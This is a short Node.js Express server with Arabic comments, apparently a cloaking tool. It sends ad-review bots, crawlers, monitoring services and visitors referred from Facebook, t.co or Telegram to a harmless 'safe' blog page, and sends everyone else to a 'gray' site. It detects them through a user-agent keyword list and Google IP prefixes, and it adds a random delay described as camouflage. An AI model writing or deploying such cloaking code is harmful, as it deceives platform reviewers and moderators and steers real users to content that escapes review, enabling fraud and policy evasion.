const express = require("express");
const app = express();

const PORT = process.env.PORT || 3000;

// روابط الوجهات
const SAFE_PAGE = "https://treesaudia.wixstudio.com/website/blank-4";       // رابط المدونة للروبوتات
const GRAY_PAGE = "https://treesaudia.wixstudio.com/website"; // رابط الموقع الرمادي للزوار الحقيقيين

// كلمات تدل على أن الزائر روبوت أو خدمة فحص أو مراقبة
const BOT_KEYWORDS = [
  "adsbot", "googlebot", "mediapartners-google", "crawler", "spider",
  "render", "wget", "curl", "python", "node-fetch", "monitor", "uptimerobot",
  "facebookexternalhit", "slackbot", "telegrambot", "discordbot", "preview"
];

// اختياري: بعض IPات Google المعروفة (يمكنك التوسعة لاحقًا)
const knownGoogleIPs = [
  "66.249.", "64.233.", "72.14.", "203.208.", "74.125.", "216.239."
];

// دالة تحدد إذا ما كان الزائر روبوتًا
function isBot(req) {
  const ua = (req.headers['user-agent'] || "").toLowerCase();
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || "";

  const isUserAgentBot = BOT_KEYWORDS.some(bot => ua.includes(bot));
  const isIPGoogle = knownGoogleIPs.some(prefix => ip.startsWith(prefix));

  return isUserAgentBot || isIPGoogle;
}

// دالة بسيطة لفحص تلميحات أخرى (مثل الزوار من Facebook أو Telegram)
function isSuspiciousTraffic(req) {
  const referer = (req.headers['referer'] || "").toLowerCase();
  return referer.includes("facebook.com") || referer.includes("t.co") || referer.includes("telegram");
}

app.get("/", async (req, res) => {
  const ua = req.headers['user-agent'] || "no-agent";
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || "no-ip";

  console.log(`[${new Date().toISOString()}] UA: ${ua} | IP: ${ip}`);

  // تأخير عشوائي للتمويه
  await new Promise(resolve => setTimeout(resolve, Math.floor(Math.random() * 700) + 300)); // بين 300ms و 1000ms

  // التحقق
  if (isBot(req) || isSuspiciousTraffic(req)) {
    console.log("🛡️ Bot/Suspicious traffic detected - Redirecting to SAFE page");
    return res.redirect(302, SAFE_PAGE);
  }

  // الزائر الحقيقي
  console.log("👤 Human user - Redirecting to GRAY page");
  return res.redirect(302, GRAY_PAGE);
});

// بدء السيرفر
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
